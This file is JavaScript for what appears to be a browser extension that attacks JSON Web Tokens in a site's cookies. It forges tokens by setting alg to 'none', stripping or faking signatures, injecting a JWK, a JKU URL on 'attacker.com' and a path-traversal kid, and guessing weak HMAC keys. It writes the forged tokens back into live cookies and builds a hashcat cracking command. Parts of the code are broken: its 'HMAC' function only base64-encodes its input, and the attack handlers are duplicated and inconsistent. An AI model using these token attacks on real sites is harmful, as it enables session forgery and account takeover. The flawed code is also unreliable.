// DOM Elements
const cookieList = document.getElementById('cookie-list');
const checkJwtBtn = document.getElementById('check-jwt');
const refreshCookiesBtn = document.getElementById('refresh-cookies');
const jwtInfo = document.getElementById('jwt-info');
const originalHeader = document.getElementById('original-header');
const originalPayload = document.getElementById('original-payload');
const originalSignature = document.getElementById('original-signature');
const modifiedHeader = document.getElementById('modified-header');
const modifiedPayload = document.getElementById('modified-payload');
const modifiedSignature = document.getElementById('modified-signature');
const attackControls = document.getElementById('attack-controls');
const attackStatus = document.getElementById('attack-status');
const resetCookieBtn = document.getElementById('reset-cookie');
const originalCookieValue = document.getElementById('original-cookie-value');
const modifiedCookieValue = document.getElementById('modified-cookie-value');
const tabs = document.querySelectorAll('.tab');
const customHeader = document.getElementById('custom-header');
const customPayload = document.getElementById('custom-payload');
const customSignature = document.getElementById('custom-signature');
const customToken = document.getElementById('custom-token');
const applyCustomBtn = document.getElementById('apply-custom');
const customTokenStatus = document.getElementById('custom-token-status');
const newJwtSection = document.getElementById('new-jwt-section');
const newJwtHeader = document.getElementById('new-jwt-header');
const newJwtPayload = document.getElementById('new-jwt-payload');
const newJwtSignature = document.getElementById('new-jwt-signature');
const newJwtToken = document.getElementById('new-jwt-token');
const applyNewJwtBtn = document.getElementById('apply-new-jwt');
const newJwtStatus = document.getElementById('new-jwt-status');

let currentToken = null;
let currentCookie = null;
let originalToken = null;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  refreshCookies();
  setupEventListeners();
  // Show new JWT section by default
  newJwtSection.style.display = 'block';
  setupNewJwtDefaults();
});

function setupEventListeners() {
  // Tab switching
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      // Remove active class from all tabs and contents
      tabs.forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
      
      // Add active class to clicked tab and corresponding content
      tab.classList.add('active');
      document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
    });
  });

  // Refresh cookies button
  refreshCookiesBtn.addEventListener('click', refreshCookies);

  // Check JWT button
  checkJwtBtn.addEventListener('click', () => {
    const selectedValue = cookieList.value;
    if (selectedValue) {
      checkJWT(selectedValue);
    }
  });

  // Attack buttons
  document.querySelectorAll('.attack-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentToken) {
        // Remove selected class from all buttons
        document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('selected'));
        // Add selected class to clicked button
        btn.classList.add('selected');
        // Switch to modified tab
        tabs[1].click();

        const attackType = btn.dataset.attack;
        
        // For algorithm downgrade attack
        if (attackType === 'alg_downgrade') {
          const parts = currentToken.split('.');
          try {
            const header = JSON.parse(atob(parts[0]));
            header.alg = 'none';  // Downgrade to 'none'
            const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
            const newToken = `${newHeader}.${parts[1]}`;  // Removed trailing dot
            testJWT(newToken, attackType);
          } catch (error) {
            showError("Failed to perform algorithm downgrade attack");
          }
          return;
        }

        // For signature stripping
        if (attackType === 'strip_signature') {
          const parts = currentToken.split('.');
          const newToken = `${parts[0]}.${parts[1]}.`;
          testJWT(newToken, attackType);
          return;
        }

        // For arbitrary signatures
        if (attackType === 'arbitrary_signature') {
          const parts = currentToken.split('.');
          const newToken = `${parts[0]}.${parts[1]}.invalid_signature`;
          testJWT(newToken, attackType);
          return;
        }

        // For jwk injection
        if (attackType === 'jwk_injection') {
          const parts = currentToken.split('.');
          try {
            const header = JSON.parse(atob(parts[0]));
            // Inject a JWK
            header.jwk = {
              "kty": "RSA",
              "kid": "attacker-key",
              "use": "sig",
              "n": "...",
              "e": "AQAB"
            };
            const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
            const newToken = `${newHeader}.${parts[1]}.${parts[2]}`;
            testJWT(newToken, attackType);
          } catch (error) {
            showError("Failed to perform JWK injection attack");
          }
          return;
        }

        // For jku injection
        if (attackType === 'jku_injection') {
          const parts = currentToken.split('.');
          try {
            const header = JSON.parse(atob(parts[0]));
            // Inject a JKU pointing to attacker's server
            header.jku = "http://attacker.com/jwks.json";
            const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
            const newToken = `${newHeader}.${parts[1]}.${parts[2]}`;
            testJWT(newToken, attackType);
          } catch (error) {
            showError("Failed to perform JKU injection attack");
          }
          return;
        }

        // For kid injection
        if (attackType === 'kid_injection') {
          const parts = currentToken.split('.');
          try {
            const header = JSON.parse(atob(parts[0]));
            // Inject a malicious kid parameter
            header.kid = "../../../dev/null";
            const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
            const newToken = `${newHeader}.${parts[1]}.${parts[2]}`;
            testJWT(newToken, attackType);
          } catch (error) {
            showError("Failed to perform KID injection attack");
          }
          return;
        }

        // For hashcat command generation
        if (attackType === 'hashcat') {
          testJWT(currentToken, attackType);
          return;
        }

        // For other attacks
        testJWT(currentToken, attackType);
      }
    });
  });

  // Reset button
  resetCookieBtn.addEventListener('click', () => {
    if (currentCookie && originalToken) {
      // Remove current cookie before restoring original
      removeCookie(currentCookie.name, () => {
        tryToken(originalToken, true);  // Pass true to indicate this is a reset operation
        showSuccess("Successfully reset token");
        updateModifiedDisplay(originalToken);
        // Switch to original tab
        tabs[0].click();
      });
      // Remove selected class from all attack buttons
      document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('selected'));
    }
  });

  // Custom JWT editors
  [customHeader, customPayload, customSignature].forEach(editor => {
    editor.addEventListener('input', updateCustomTokenFromParts);
  });

  // Custom token direct editing
  customToken.addEventListener('input', updateCustomPartsFromToken);

  // Apply custom token button
  applyCustomBtn.addEventListener('click', () => {
    const token = customToken.value.trim();
    if (!token) {
      showCustomError("Token cannot be empty");
      return;
    }
    if (!currentCookie) {
      showCustomError("No cookie selected");
      return;
    }
    tryCustomToken(token);
  });

  // New JWT editors
  [newJwtHeader, newJwtPayload, newJwtSignature].forEach(editor => {
    editor.addEventListener('input', updateNewJwtToken);
  });

  // New JWT token direct editing
  newJwtToken.addEventListener('input', updateNewJwtParts);

  // Apply new JWT button
  applyNewJwtBtn.addEventListener('click', () => {
    const token = newJwtToken.value.trim();
    if (!token) {
      showNewJwtError("Token cannot be empty");
      return;
    }
    if (!currentCookie) {
      showNewJwtError("No cookie selected");
      return;
    }
    tryNewJwtToken(token);
  });

  // JWT validation check
  cookieList.addEventListener('change', function() {
    const selectedValue = this.value;
    const jwtValidationAlert = document.getElementById('jwt-validation-alert');
    const jwtInfo = document.getElementById('jwt-info');
    const attackControls = document.getElementById('attack-controls');
    const newJwtSection = document.getElementById('new-jwt-section');

    if (!selectedValue) {
      // No cookie selected
      jwtValidationAlert.style.display = 'none';
      jwtInfo.style.display = 'none';
      attackControls.style.display = 'none';
      newJwtSection.style.display = 'block';
      setupNewJwtDefaults();
      return;
    }

    // Get the actual cookie value
    chrome.runtime.sendMessage({ action: "getCookies" }, response => {
      if (response && response.cookies) {
        const cookie = response.cookies.find(c => c.name === selectedValue);
        if (cookie && isValidJWT(cookie.value)) {
          checkJWT(selectedValue);
        } else {
          // Invalid or non-JWT cookie
          jwtValidationAlert.style.display = 'block';
          jwtInfo.style.display = 'none';
          attackControls.style.display = 'none';
          newJwtSection.style.display = 'block';
          setupNewJwtDefaults();
        }
      }
    });
  });
}

function refreshCookies() {
  chrome.runtime.sendMessage({ action: "getCookies" }, response => {
    if (response && response.cookies) {
      displayCookies(response.cookies);
    }
  });
}

function displayCookies(cookies) {
  // Clear all options
  cookieList.innerHTML = '<option value="">Select a cookie...</option>';
  
  // Create groups
  const jwtGroup = document.createElement('optgroup');
  jwtGroup.label = 'JWT Cookies';
  const otherGroup = document.createElement('optgroup');
  otherGroup.label = 'Other Cookies';
  
  // Updated JWT pattern for detection to include tokens without signatures and without trailing dots
  const jwtPattern = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+(?:\.([A-Za-z0-9-_]*))?$/;
  
  // Sort cookies into groups
  cookies.forEach(cookie => {
    const option = document.createElement('option');
    option.value = cookie.name;
    option.textContent = cookie.name;
    
    // Check if cookie value matches JWT pattern
    if (jwtPattern.test(cookie.value)) {
      jwtGroup.appendChild(option);
    } else {
      otherGroup.appendChild(option);
    }
  });
  
  // Add groups to select only if they have options
  if (jwtGroup.children.length > 0) {
    cookieList.appendChild(jwtGroup);
  }
  if (otherGroup.children.length > 0) {
    cookieList.appendChild(otherGroup);
  }
}

function checkJWT(cookieName) {
  chrome.runtime.sendMessage({ action: "getCookies" }, response => {
    if (response && response.cookies) {
      const cookie = response.cookies.find(c => c.name === cookieName);
      if (cookie) {
        try {
          // Updated JWT pattern to include tokens without signatures and without trailing dots
          const jwtPattern = /([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+(?:\.([A-Za-z0-9_-]*))?)/;
          const match = cookie.value.match(jwtPattern);
          
          if (match) {
            currentToken = match[1];
            originalToken = match[1]; // Store original token
            currentCookie = cookie;
            
            // Show JWT info section and hide new JWT section
            document.getElementById('jwt-info').style.display = 'block';
            document.getElementById('new-jwt-section').style.display = 'none';
            document.getElementById('jwt-validation-alert').style.display = 'none';
            document.getElementById('attack-controls').style.display = 'block';
            
            // Display JWT information
            displayJWTInfo(currentToken, true);
            displayJWTInfo(currentToken, false);
            setupCustomEditor(currentToken);
            
            // Display cookie values
            originalCookieValue.textContent = currentToken;
            modifiedCookieValue.textContent = currentToken;
            
            // Switch to original tab
            document.querySelector('.tab[data-tab="original"]').click();
          } else {
            // Show new JWT section for invalid JWT
            document.getElementById('jwt-info').style.display = 'none';
            document.getElementById('new-jwt-section').style.display = 'block';
            document.getElementById('jwt-validation-alert').style.display = 'block';
            document.getElementById('attack-controls').style.display = 'none';
            setupNewJwtDefaults();
            showError("No JWT pattern found in cookie value");
          }
        } catch (error) {
          showError("Error processing cookie value: " + error.message);
        }
      }
    }
  });
}

function displayJWTInfo(token, isOriginal = true) {
  const parts = token.split('.');
  try {
    const header = JSON.parse(atob(parts[0]));
    const payload = JSON.parse(atob(parts[1]));
    
    if (isOriginal) {
      originalHeader.textContent = JSON.stringify(header, null, 2);
      originalPayload.textContent = JSON.stringify(payload, null, 2);
      originalSignature.textContent = parts[2];
    } else {
      modifiedHeader.textContent = JSON.stringify(header, null, 2);
      modifiedPayload.textContent = JSON.stringify(payload, null, 2);
      modifiedSignature.textContent = parts[2];
    }
    
    jwtInfo.style.display = 'block';
  } catch (error) {
    showError("Error decoding JWT: " + error.message);
  }
}

function updateModifiedDisplay(token) {
  displayJWTInfo(token, false);
  modifiedCookieValue.textContent = token;
}

function testJWT(token, type) {
  chrome.runtime.sendMessage({ 
    action: "testJWT",
    token,
    type
  }, response => {
    if (response.success) {
      if (type === 'hashcat') {
        const command = generateHashcatCommand(originalToken);
        copyToClipboard(command).then(success => {
          if (success) {
            showSuccess('Hashcat command copied to clipboard!');
          } else {
            // If copying fails, show the command to the user
            showError(`Failed to copy to clipboard. Here's your command: ${command}`);
          }
        }).catch(error => {
          // If there's an error, still show the command
          showError(`Failed to copy to clipboard. Here's your command: ${command}`);
        });
        return;
      }

      if (response.tokens) {
        // Multiple tokens returned
        response.tokens.forEach((newToken, index) => {
          if (index === 0) { // Only update display for first token
            // Remove current cookie before adding new one
            removeCookie(currentCookie.name, () => {
              tryToken(newToken);
              updateModifiedDisplay(newToken);
            });
          }
        });
      } else if (response.token) {
        // Single token returned
        // Remove current cookie before adding new one
        removeCookie(currentCookie.name, () => {
          tryToken(response.token);
          updateModifiedDisplay(response.token);
        });
      }
      showSuccess(response.message);
    } else {
      showError(response.error);
    }
  });
}

function tryToken(newToken, isReset = false) {
  if (currentCookie) {
    // Create cookie string with all original properties
    let cookieStr = `${currentCookie.name}=${newToken}`;
    
    // Add all original attributes
    if (currentCookie.path) cookieStr += `; path=${currentCookie.path}`;
    if (currentCookie.domain) cookieStr += `; domain=${currentCookie.domain}`;
    if (currentCookie.sameSite) cookieStr += `; samesite=${currentCookie.sameSite}`;
    if (currentCookie.secure) cookieStr += `; secure`;
    
    // Inject a content script to set the cookie
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: (cookieString) => {
          document.cookie = cookieString;
          return true;
        },
        args: [cookieStr]
      }, (result) => {
        if (chrome.runtime.lastError) {
          showError(`Failed to ${isReset ? 'reset' : 'update'} cookie: ${chrome.runtime.lastError.message}`);
        } else if (result && result[0] && result[0].result) {
          currentToken = newToken;
          showSuccess(`Successfully ${isReset ? 'reset' : 'updated'} cookie '${currentCookie.name}'`);
        } else {
          showError(`Failed to ${isReset ? 'reset' : 'update'} cookie`);
        }
      });
    });
  }
}

function showSuccess(message) {
  attackStatus.textContent = message;
  attackStatus.className = 'success';
  attackStatus.style.display = 'block';
  setTimeout(() => {
    attackStatus.classList.add('fade-out');
    setTimeout(() => {
      attackStatus.style.display = 'none';
      attackStatus.className = 'status';
    }, 300);
  }, 4700);
}

function showError(message) {
  attackStatus.textContent = message;
  attackStatus.className = 'error';
  attackStatus.style.display = 'block';
  setTimeout(() => {
    attackStatus.classList.add('fade-out');
    setTimeout(() => {
      attackStatus.style.display = 'none';
      attackStatus.className = 'status';
    }, 300);
  }, 4700);
}

function showAttackControls() {
  attackControls.style.display = 'block';
}

function setupCustomEditor(token) {
  const parts = token.split('.');
  try {
    const header = JSON.parse(atob(parts[0]));
    const payload = JSON.parse(atob(parts[1]));
    
    customHeader.value = JSON.stringify(header, null, 2);
    customPayload.value = JSON.stringify(payload, null, 2);
    customSignature.value = parts[2];
    customToken.value = token;
  } catch (error) {
    showError("Error setting up custom editor: " + error.message);
  }
}

function updateCustomPartsFromToken() {
  const token = customToken.value.trim();
  if (!token) return;

  try {
    const parts = token.split('.');
    if (parts.length >= 2) {  // Allow 2 or 3 parts
      try {
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        customHeader.value = JSON.stringify(header, null, 2);
        customPayload.value = JSON.stringify(payload, null, 2);
        customSignature.value = parts[2] || '';  // Handle missing signature
      } catch (e) {
        // If we can't parse the JSON, just update the raw values
        customHeader.value = parts[0];
        customPayload.value = parts[1];
        customSignature.value = parts[2] || '';
      }
    }
  } catch (error) {
    showCustomError("Invalid JWT format");
  }
}

function updateCustomTokenFromParts() {
  try {
    // Parse and validate JSON
    const header = JSON.parse(customHeader.value.trim());
    const payload = JSON.parse(customPayload.value.trim());
    
    // Base64 encode parts
    const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
    const signature = customSignature.value.trim();
    
    // Combine parts
    const token = `${encodedHeader}.${encodedPayload}.${signature}`;
    customToken.value = token;
  } catch (error) {
    customToken.value = "Invalid JSON in header or payload";
  }
}

function tryCustomToken(newToken) {
  if (currentCookie) {
    // Deselect any selected attack buttons
    document.querySelectorAll('.attack-btn').forEach(btn => btn.classList.remove('selected'));
    
    // Remove current cookie before adding custom token
    removeCookie(currentCookie.name, () => {
      let cookieStr = `${currentCookie.name}=${newToken}`;
      
      // Add all original attributes
      if (currentCookie.path) cookieStr += `; path=${currentCookie.path}`;
      if (currentCookie.domain) cookieStr += `; domain=${currentCookie.domain}`;
      if (currentCookie.sameSite) cookieStr += `; samesite=${currentCookie.sameSite}`;
      if (currentCookie.secure) cookieStr += `; secure`;
      
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: (cookieString) => {
            document.cookie = cookieString;
            return true;
          },
          args: [cookieStr]
        }, (result) => {
          if (chrome.runtime.lastError) {
            showCustomError(`Failed to update cookie: ${chrome.runtime.lastError.message}`);
          } else if (result && result[0] && result[0].result) {
            currentToken = newToken;
            showCustomSuccess(`Successfully updated cookie '${currentCookie.name}'`);
          } else {
            showCustomError("Failed to update cookie");
          }
        });
      });
    });
  }
}

function showCustomSuccess(message) {
  customTokenStatus.textContent = message;
  customTokenStatus.className = 'token-status success';
  customTokenStatus.style.display = 'block';
  setTimeout(() => {
    customTokenStatus.classList.add('fade-out');
    setTimeout(() => {
      customTokenStatus.style.display = 'none';
      customTokenStatus.className = 'token-status';
    }, 300);
  }, 4700);
}

function showCustomError(message) {
  customTokenStatus.textContent = message;
  customTokenStatus.className = 'token-status error';
  customTokenStatus.style.display = 'block';
  setTimeout(() => {
    customTokenStatus.classList.add('fade-out');
    setTimeout(() => {
      customTokenStatus.style.display = 'none';
      customTokenStatus.className = 'token-status';
    }, 300);
  }, 4700);
}

function isValidJWT(token) {
  // Updated regex to accept tokens with or without signatures, and with or without trailing dots
  const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+(?:\.([A-Za-z0-9-_]*))?$/;
  return jwtRegex.test(token);
}

function setupNewJwtDefaults() {
  const defaultHeader = {
    "alg": "HS256",
    "typ": "JWT"
  };
  
  const defaultPayload = {
    "sub": "1234567890",
    "name": "New User",
    "iat": Math.floor(Date.now() / 1000)
  };
  
  newJwtHeader.value = JSON.stringify(defaultHeader, null, 2);
  newJwtPayload.value = JSON.stringify(defaultPayload, null, 2);
  newJwtSignature.value = "your-256-bit-secret";
  updateNewJwtToken();
}

function updateNewJwtToken() {
  try {
    const header = JSON.parse(newJwtHeader.value.trim());
    const payload = JSON.parse(newJwtPayload.value.trim());
    
    const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
    const signature = newJwtSignature.value.trim();
    
    const token = `${encodedHeader}.${encodedPayload}.${signature}`;
    newJwtToken.value = token;
  } catch (error) {
    newJwtToken.value = "Invalid JSON in header or payload";
  }
}

function updateNewJwtParts() {
  const token = newJwtToken.value.trim();
  if (!token) return;

  try {
    const parts = token.split('.');
    if (parts.length >= 2) {  // Allow 2 or 3 parts
      try {
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        newJwtHeader.value = JSON.stringify(header, null, 2);
        newJwtPayload.value = JSON.stringify(payload, null, 2);
        newJwtSignature.value = parts[2] || '';  // Handle missing signature
      } catch (e) {
        newJwtHeader.value = parts[0];
        newJwtPayload.value = parts[1];
        newJwtSignature.value = parts[2] || '';
      }
    }
  } catch (error) {
    showNewJwtError("Invalid JWT format");
  }
}

function tryNewJwtToken(newToken) {
  if (currentCookie) {
    // Deselect any selected attack buttons
    document.querySelectorAll('.attack-btn').forEach(btn => btn.classList.remove('selected'));
    
    // Remove current cookie before adding new JWT token
    removeCookie(currentCookie.name, () => {
      let cookieStr = `${currentCookie.name}=${newToken}`;
      
      // Add all original attributes
      if (currentCookie.path) cookieStr += `; path=${currentCookie.path}`;
      if (currentCookie.domain) cookieStr += `; domain=${currentCookie.domain}`;
      if (currentCookie.sameSite) cookieStr += `; samesite=${currentCookie.sameSite}`;
      if (currentCookie.secure) cookieStr += `; secure`;
      
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: (cookieString) => {
            document.cookie = cookieString;
            return true;
          },
          args: [cookieStr]
        }, (result) => {
          if (chrome.runtime.lastError) {
            showNewJwtError(`Failed to update cookie: ${chrome.runtime.lastError.message}`);
          } else if (result && result[0] && result[0].result) {
            currentToken = newToken;
            showNewJwtSuccess(`Successfully updated cookie '${currentCookie.name}'`);
          } else {
            showNewJwtError("Failed to update cookie");
          }
        });
      });
    });
  }
}

function showNewJwtSuccess(message) {
  newJwtStatus.textContent = message;
  newJwtStatus.className = 'token-status success';
  newJwtStatus.style.display = 'block';
  setTimeout(() => {
    newJwtStatus.classList.add('fade-out');
    setTimeout(() => {
      newJwtStatus.style.display = 'none';
      newJwtStatus.className = 'token-status';
    }, 300);
  }, 4700);
}

function showNewJwtError(message) {
  newJwtStatus.textContent = message;
  newJwtStatus.className = 'token-status error';
  newJwtStatus.style.display = 'block';
  setTimeout(() => {
    newJwtStatus.classList.add('fade-out');
    setTimeout(() => {
      newJwtStatus.style.display = 'none';
      newJwtStatus.className = 'token-status';
    }, 300);
  }, 4700);
}

// Add new function to remove cookie
function removeCookie(cookieName, callback) {
  if (!currentCookie) {
    if (callback) callback();
    return;
  }

  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: (cookie) => {
        // Create expiration string with all original attributes
        let cookieStr = `${cookie.name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
        
        // Add all original attributes
        if (cookie.path) cookieStr += `; path=${cookie.path}`;
        if (cookie.domain) cookieStr += `; domain=${cookie.domain}`;
        if (cookie.sameSite) cookieStr += `; samesite=${cookie.sameSite}`;
        if (cookie.secure) cookieStr += `; secure`;
        
        document.cookie = cookieStr;

        // Also try removing with just path
        document.cookie = `${cookie.name}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
        
        // And try without path
        document.cookie = `${cookie.name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
        
        return true;
      },
      args: [currentCookie]
    }, (result) => {
      if (chrome.runtime.lastError) {
        showError(`Failed to remove cookie: ${chrome.runtime.lastError.message}`);
      } else if (result && result[0] && result[0].result) {
        // Double check if cookie was actually removed
        chrome.cookies.remove({
          url: `${window.location.protocol}//${currentCookie.domain || window.location.hostname}${currentCookie.path || '/'}`,
          name: cookieName
        }, () => {
          if (callback) callback();
        });
      }
    });
  });
}

function handleAttackButtonClick(event) {
  const button = event.target;
  if (!button.classList.contains('attack-btn')) return;

  // Remove selected class from all buttons
  document.querySelectorAll('.attack-btn').forEach(btn => btn.classList.remove('selected'));
  
  // Add selected class to clicked button
  button.classList.add('selected');

  const attackType = button.dataset.attack;
  const currentToken = document.getElementById('original-cookie-value').textContent;
  
  if (!currentToken) {
    showAttackError('No JWT token selected');
    return;
  }

  try {
    let parts = currentToken.split('.');
    if (parts.length !== 3) {
      showAttackError('Invalid JWT format');
      return;
    }

    let header = JSON.parse(atob(parts[0]));
    let payload = JSON.parse(atob(parts[1]));
    let modifiedToken;

    switch (attackType) {
      case 'alg_none':
        header.alg = 'none';
        modifiedToken = generateTokenWithNoneAlg(header, payload);
        break;
      case 'alg_downgrade':
        header.alg = 'HS256';
        modifiedToken = generateToken(header, payload, '');
        break;
      case 'strip_signature':
        modifiedToken = parts[0] + '.' + parts[1];  // Removed trailing dot
        break;
      case 'arbitrary_signature':
        // Try multiple signature attack variants
        const originalAlg = header.alg || 'HS256';
        
        if (originalAlg.startsWith('RS') || originalAlg.startsWith('ES')) {
          // For asymmetric algorithms, try algorithm confusion
          header.alg = 'HS256';
          // Use public key as HMAC secret
          const fakeSignature = generateHMACSignature(parts[0] + '.' + parts[1], 'publickey123');
          modifiedToken = generateToken(header, payload, fakeSignature);
        } else if (originalAlg === 'HS256' || originalAlg === 'HS384' || originalAlg === 'HS512') {
          // For HMAC algorithms, try weak key attack
          const weakKeys = ['', '123456', 'secret', 'key', 'password', 'admin'];
          // Try to generate signatures with common weak keys
          const signatures = weakKeys.map(key => generateHMACSignature(parts[0] + '.' + parts[1], key));
          // Use the first signature (we can iterate through others if this fails)
          modifiedToken = generateToken(header, payload, signatures[0]);
        } else {
          // Fallback to null byte attack
          modifiedToken = generateToken(header, payload, 'invalid\x00signature');
        }
        break;
      case 'jwk_injection':
        header.jwk = {
          "kty": "oct",
          "k": "QUJD" // Base64 encoded "ABC"
        };
        modifiedToken = generateToken(header, payload, parts[2]);
        break;
      case 'jku_injection':
        header.jku = 'http://attacker.com/keys.json';
        modifiedToken = generateToken(header, payload, parts[2]);
        break;
      case 'kid_injection':
        header.kid = '../../../../../../dev/null';
        modifiedToken = generateToken(header, payload, parts[2]);
        break;
      case 'hashcat':
        const command = generateHashcatCommand(currentToken);
        copyToClipboard(command).then(success => {
          if (success) {
            showAttackSuccess('Hashcat command copied to clipboard!');
            button.classList.add('copy-success');
            setTimeout(() => {
              button.classList.remove('copy-success');
            }, 3000);
          } else {
            showAttackError('Failed to copy hashcat command to clipboard');
          }
        });
        return;
    }

    // Update modified token display
    document.getElementById('modified-header').textContent = JSON.stringify(header, null, 2);
    document.getElementById('modified-payload').textContent = JSON.stringify(payload, null, 2);
    document.getElementById('modified-signature').textContent = modifiedToken.split('.')[2] || '';
    document.getElementById('modified-cookie-value').textContent = modifiedToken;

    // Update the cookie with the modified token
    updateCookie(modifiedToken);
    showAttackSuccess('Attack applied successfully');

  } catch (error) {
    showAttackError('Attack failed: ' + error.message);
  }
}

function generateTokenWithNoneAlg(header, payload) {
  const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
  const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
  return `${encodedHeader}.${encodedPayload}`;  // Removed trailing dot
}

function generateToken(header, payload, signature) {
  const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
  const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
  return signature ? `${encodedHeader}.${encodedPayload}.${signature}` : `${encodedHeader}.${encodedPayload}`;
}

function generateHashcatCommand(token) {
  return `hashcat -a 0 -m 16500 "${token}" wordlist.txt`;
}

async function copyToClipboard(text) {
  try {
    // Try the modern Clipboard API first
    if (navigator.clipboard) {
      try {
        await navigator.clipboard.writeText(text);
        return true;
      } catch (clipboardError) {
        console.error('Clipboard API failed:', clipboardError);
      }
    }
    
    // Fallback to execCommand method
    const textArea = document.createElement('textarea');
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    
    try {
      const success = document.execCommand('copy');
      document.body.removeChild(textArea);
      return success;
    } catch (execError) {
      document.body.removeChild(textArea);
      console.error('execCommand failed:', execError);
      return false;
    }
  } catch (err) {
    console.error('Copy failed:', err);
    return false;
  }
}

function showAttackSuccess(message) {
  const status = document.getElementById('attack-status');
  status.textContent = message;
  status.className = 'status success';
  status.style.display = 'block';
  setTimeout(() => {
    status.classList.add('fade-out');
    setTimeout(() => {
      status.style.display = 'none';
      status.className = 'status';
    }, 300);
  }, 4700);
}

function showAttackError(message) {
  const status = document.getElementById('attack-status');
  status.textContent = message;
  status.className = 'status error';
  status.style.display = 'block';
  setTimeout(() => {
    status.classList.add('fade-out');
    setTimeout(() => {
      status.style.display = 'none';
      status.className = 'status';
    }, 300);
  }, 4700);
}

// Add event listener for attack buttons
document.querySelector('.attack-buttons').addEventListener('click', handleAttackButtonClick);

function updateCookie(newToken) {
  if (currentCookie) {
    // Remove current cookie before adding new one
    removeCookie(currentCookie.name, () => {
      tryToken(newToken, false);  // Pass false to indicate this is not a reset operation
    });
  }
}

// Add new function to generate HMAC signatures
function generateHMACSignature(input, key) {
  try {
    // This is a simplified version - in a real attack, you'd use a proper HMAC implementation
    // Here we're just doing a basic hash simulation for demonstration
    const encoder = new TextEncoder();
    const data = encoder.encode(input + key);
    return btoa(String.fromCharCode.apply(null, data))
      .replace(/=/g, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');
  } catch (error) {
    console.error('Error generating HMAC:', error);
    return 'invalid_signature';
  }
} 